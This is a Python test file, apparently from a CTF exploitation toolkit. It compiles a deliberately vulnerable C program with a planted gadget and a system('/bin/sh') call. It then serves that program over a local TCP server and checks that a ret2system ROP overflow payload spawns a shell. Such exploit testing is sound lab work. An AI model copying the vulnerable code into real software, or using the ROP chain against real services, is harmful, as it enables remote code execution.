"""원격 흐름 실측: 확정 payload 가 실제 TCP 서비스에서도 셸을 따는지 증명.

로컬 PTY 셸 증명(:func:`sandbox.runner.verify_shell`)과 달리, 취약 바이너리를 로컬
forking TCP 서버로 **네트워크 서비스처럼** 서빙(소켓을 stdin/stdout 으로 dup2 후
execv — CTF 인프라와 동형)하고, :func:`sandbox.remote.prove_shell_remote` 로 확정
ret2system payload 를 소켓에 던져 spawn 된 셸에서 marker 를 회수한다. 이는
:mod:`analyzer.exploit_script` 가 생성하는 ``remote(HOST,PORT)`` 스크립트의 원격 가능성
주장을 실제 TCP 연결로 뒷받침한다(비 PIE 절대주소라 로컬 증명 = 원격 성립).
"""

from __future__ import annotations

import os
import platform
import shutil
import socketserver
import subprocess
import threading

import pytest

from pwnable_lab.analyzer.strategy import find_ret_gadget, ret2system_plan
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.remote import prove_shell_remote

_SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}
_HAVE_GCC = shutil.which("gcc") is not None

# 비 PIE ret2system 재료(pop rdi 가젯 + system + "/bin/sh"), read → offset 72.
_R2S_SRC = (
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
    '__asm__(".global g_pop_rdi\\ng_pop_rdi: pop %rdi\\n ret\\n");\n'
    'void never(void){ char *s="/bin/sh"; system(s); }\n'
    "void vuln(void){ char buf[64]; setvbuf(stdout, 0, 2, 0); read(0, buf, 300); }\n"
    "int main(void){ vuln(); return 0; }\n"
)


def _make_handler(binary: str):
    class _Handler(socketserver.BaseRequestHandler):
        def handle(self) -> None:  # pragma: no cover - 자식 프로세스에서 execv
            fd = self.request.fileno()
            os.dup2(fd, 0)
            os.dup2(fd, 1)
            os.execv(binary, [binary])

    return _Handler


class _Forking(socketserver.ForkingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


@pytest.mark.skipif(
    not (_SUPPORTED and _HAVE_GCC),
    reason="Linux/x86-64 + gcc 필요(실제 실행/소켓)",
)
def test_confirmed_payload_proves_shell_over_tcp(tmp_path):
    csrc = tmp_path / "r.c"
    csrc.write_text(_R2S_SRC)
    binary = tmp_path / "r"
    subprocess.run(
        ["gcc", "-fno-stack-protector", "-no-pie", "-o", str(binary), str(csrc)],
        check=True,
        capture_output=True,
    )
    img = parse_elf(binary.read_bytes())
    plan = ret2system_plan(img)
    assert plan is not None
    ret = find_ret_gadget(img)

    server = _Forking(("127.0.0.1", 0), _make_handler(str(binary)))
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        proven = None
        # SysV movaps 정렬 변형(정렬용 ret 0/1개)을 원격에서도 시도.
        for align in (False, True):
            chain = [RopStep(plan["binsh"])]
            if align and ret is not None:
                chain.append(RopStep(ret))
            chain.append(RopStep(plan["system"]))
            payload = build_overflow(72, plan["pop_rdi"], bits=64, chain=chain)
            proof = prove_shell_remote(
                "127.0.0.1",
                port,
                payload,
                marker=f"PWNPILOT_REMOTE_{int(align)}",
                timeout=5.0,
            )
            if proof.shell_spawned:
                proven = proof
                break
        assert proven is not None, "원격 소켓에서 셸을 증명하지 못했습니다."
        assert proven.shell_spawned is True
        assert proven.marker in proven.output.decode("utf-8", "replace")
    finally:
        server.shutdown()
        server.server_close()


def test_prove_shell_remote_reports_failure_on_closed_port():
    """연결 실패/무응답이면 shell_spawned=False(예외 없이 실패 보고)."""
    # 리스닝만 하고 아무 것도 안 하는 서버 → payload 를 소비하지 않아 marker 미회수.
    server = _Forking(("127.0.0.1", 0), _make_handler("/bin/true"))
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        proof = prove_shell_remote(
            "127.0.0.1", port, b"A" * 8, marker="PWNPILOT_NOPE", timeout=2.0
        )
        assert proof.shell_spawned is False
    finally:
        server.shutdown()
        server.server_close()
